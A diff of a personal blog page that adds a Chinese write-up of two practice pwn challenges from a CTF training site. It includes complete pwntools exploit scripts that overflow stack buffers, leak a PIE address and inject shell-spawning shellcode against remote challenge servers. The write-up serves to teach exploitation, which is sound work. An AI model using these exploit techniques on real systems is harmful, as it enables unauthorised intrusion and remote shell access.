@@ -22,11 +22,11 @@
   
 
 <title>
-  攻防世界 Reverse | Cyzrjz
+  攻防世界 Pwn | Cyzrjz
 </title>
 <meta
   name="description"
-  content="逆向刷题"
+  content="Pwn刷题"
 />
 
 
@@ -114,12 +114,12 @@
 
 
   <meta property="og:type" content="website" />
-  <meta property="og:title" content="攻防世界 Reverse | Cyzrjz" />
+  <meta property="og:title" content="攻防世界 Pwn | Cyzrjz" />
   <meta
     property="og:description"
-    content="逆向刷题"
+    content="Pwn刷题"
   />
-  <meta property="og:url" content="https://cyzrjz.github.io/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-reverse/" />
+  <meta property="og:url" content="https://cyzrjz.github.io/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/" />
   <meta
     property="og:site_name"
     content="W31c0me t0 My610g"
@@ -129,10 +129,10 @@
     content="/"
   />
   <meta property="article:author" content="Cyzrjz" />
-  <meta property="article:published_time" content="2025-04-25T20:36:13&#43;08:00" />
-  <meta property="article:modified_time" content="2025-04-25T20:36:13&#43;08:00" />
+  <meta property="article:published_time" content="2025-04-25T23:39:48&#43;08:00" />
+  <meta property="article:modified_time" content="2025-04-25T23:39:48&#43;08:00" />
   
-    <meta property="article:tag" content="逆向训练" />
+    <meta property="article:tag" content="Pwn" />
   
   
   <meta name="twitter:card" content="summary" />
@@ -341,7 +341,7 @@
           
         </picture>
         
-          <img  fetchpriority="high" src="/images/my/banner.png" alt="攻防世界 Reverse">
+          <img  fetchpriority="high" src="/images/my/banner.png" alt="攻防世界 Pwn">
         
       
     
@@ -357,7 +357,7 @@
   
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">攻防世界 Reverse</h1>
+            <h1 data-aos="slide-up">攻防世界 Pwn</h1>
           </a>
         
       
@@ -390,7 +390,21 @@
             <div class="sidebar-toc">
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class">
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-pwnstackn1">1. pwnstack[N1]</a>
+      <ul>
+        <li><a href="#exp">exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-repeatern1">2. repeater[N1]</a>
+      <ul>
+        <li><a href="#分析">分析</a></li>
+        <li><a href="#exp-1">exp</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
   </div>
 </div>
           </div>
@@ -532,7 +546,7 @@
     class="article-date-link"
     data-aos="zoom-in"
   >
-    <time datetime="2025-04-25 20:36:13 &#43;0800 &#43;0800" itemprop="datePublished"
+    <time datetime="2025-04-25 23:39:48 &#43;0800 &#43;0800" itemprop="datePublished"
       >2025-04-25</time
     >
     <time style="display: none;" id="post-update-time"
@@ -551,7 +565,86 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        
+        <h2 id="1-pwnstackn1">
+<a class="header-anchor" href="#1-pwnstackn1"></a>
+1. pwnstack[N1]
+</h2><h3 id="exp">
+<a class="header-anchor" href="#exp"></a>
+exp
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># r = process(&#34;./pwn2&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;223.112.5.141&#39;</span><span class="p">,</span> <span class="mi">58471</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">back_door</span> <span class="o">=</span> <span class="mh">0x400762</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0xA0</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">back_door</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="2-repeatern1">
+<a class="header-anchor" href="#2-repeatern1"></a>
+2. repeater[N1]
+</h2><h3 id="分析">
+<a class="header-anchor" href="#%e5%88%86%e6%9e%90"></a>
+分析
+</h3><p>checksec输出：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Arch:     amd64
+</span></span><span class="line"><span class="cl">RELRO:      Full RELRO <span class="c1">#GOT只读</span>
+</span></span><span class="line"><span class="cl">Stack:      No canary found <span class="c1">#栈溢出保护未开</span>
+</span></span><span class="line"><span class="cl">NX:         NX unknown - GNU_STACK missing
+</span></span><span class="line"><span class="cl">PIE:        PIE enabled <span class="c1">#地址随机化</span>
+</span></span><span class="line"><span class="cl">Stack:      Executable <span class="c1">#栈可执行</span>
+</span></span><span class="line"><span class="cl">RWX:        Has RWX segments
+</span></span></code></pre></div><p>栈可执行，大概率要写入shellcode，开启了PIE，需要泄露main函数地址
+IDA查看
+<img src="/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/img/image-1.png" alt="alt text"><img src="/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/img/image-2.png" alt="alt text">
+没有后门，那就要写入shellcode然后利用栈溢出执行了</p>
+<p><code>sub_982(s_, 48);</code>可以将shellcode写入s_地址，也就是最后需要ret的地址</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;name :&#34;</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
+</span></span></code></pre></div><p>for循环处有一个read，Tab键查看写入的地址</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">lea</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">30h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">40h</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>     <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="nf">call</span>    <span class="nv">_read</span>
+</span></span></code></pre></div><p>再看n1192227的写入地址</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">10h</span><span class="p">],</span> <span class="mh">123123h</span>
+</span></span></code></pre></div><p>中间相隔0x20，需要覆盖这段地址，然后往<strong>n1192227写入3281697使if语句成立泄露main函数地址</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="mi">3281697</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;input :&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;you :</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1">#puts函数自带\n</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="c1">#返回0x12字节，加上0x需要接收12+2个字节</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+</span></span></code></pre></div><p>最后要将shellcode写入栈，结束for循环，执行shellocde</p>
+<p>只要将n1192227写入1即可结束循环</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">+</span> <span class="mh">0x202040</span> <span class="o">-</span> <span class="mh">0xA33</span> <span class="c1">#0x202040 - 0xA33是shellcode写入的地址和main函数的偏移，真实地址 + 偏移 = shellcode地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span> <span class="c1">#写入b&#34;a&#34; * 0x10而不是0x10+8，因为前面已经写入了p64(0x1)，相当于把+8前置，b&#34;a&#34; * 0x10已经覆盖了ebp</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;input :&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="exp-1">
+<a class="header-anchor" href="#exp-1"></a>
+exp
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># r = process(&#34;./repeater&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;223.112.5.141&#39;</span><span class="p">,</span><span class="mi">61135</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;name :&#34;</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="mi">3281697</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;input :&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;you :</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">+</span> <span class="mh">0x202040</span> <span class="o">-</span> <span class="mh">0xA33</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;input :&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div>
       
     </div>
     <footer class="article-footer">
@@ -575,18 +668,9 @@
     <li class="article-tag-list-item" data-aos="zoom-in">
       <a
         class="article-tag-list-link"
-        href="/tags/%e9%80%86%e5%90%91"
+        href="/tags/pwn"
         rel="tag"
-        >逆向</a
-      >
-    </li>
-  
-    <li class="article-tag-list-item" data-aos="zoom-in">
-      <a
-        class="article-tag-list-link"
-        href="/tags/%e8%ae%ad%e7%bb%83"
-        rel="tag"
-        >训练</a
+        >PWN</a
       >
     </li>
   
@@ -606,30 +690,7 @@
           
           
             <img
-              data-src="/images/my/6.jpg"
-              data-sizes="auto"
-              alt="BUU-Reverse"
-              class="lazyload"
-            />
-          
-        
-        <a href="/post/buuctf-reverse/"></a>
-        <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">
-          
-            BUU-Reverse
-          
-        </h3>
-      </div>
-    
-
-    
-      <div class="article-nav-link-wrap article-nav-link-right">
-        
-          
-          
-            <img
-              data-src="/images/my/19.jpg"
+              data-src="/images/my/2.jpg"
               data-sizes="auto"
               alt="JQCTF2025"
               class="lazyload"
@@ -637,13 +698,15 @@
           
         
         <a href="/post/jqctf2025/"></a>
-        <div class="article-nav-caption">后一篇</div>
+        <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">
           
             JQCTF2025
           
         </h3>
       </div>
+    
+
     
   </nav>
 
@@ -784,7 +847,21 @@
           <div class="sidebar-toc">
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class">
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-pwnstackn1">1. pwnstack[N1]</a>
+      <ul>
+        <li><a href="#exp">exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-repeatern1">2. repeater[N1]</a>
+      <ul>
+        <li><a href="#分析">分析</a></li>
+        <li><a href="#exp-1">exp</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
   </div>
 </div>
         </div>
@@ -1177,9 +1254,9 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "Cyzrjz",
-          title: "攻防世界 Reverse",
-          url: "https:\/\/cyzrjz.github.io\/post\/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-reverse\/",
-          description: "逆向刷题",
+          title: "攻防世界 Pwn",
+          url: "https:\/\/cyzrjz.github.io\/post\/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn\/",
+          description: "Pwn刷题",
           cover: "https:\/\/cyzrjz.github.io\/images\/my\/banner.png",
         };
       </script>
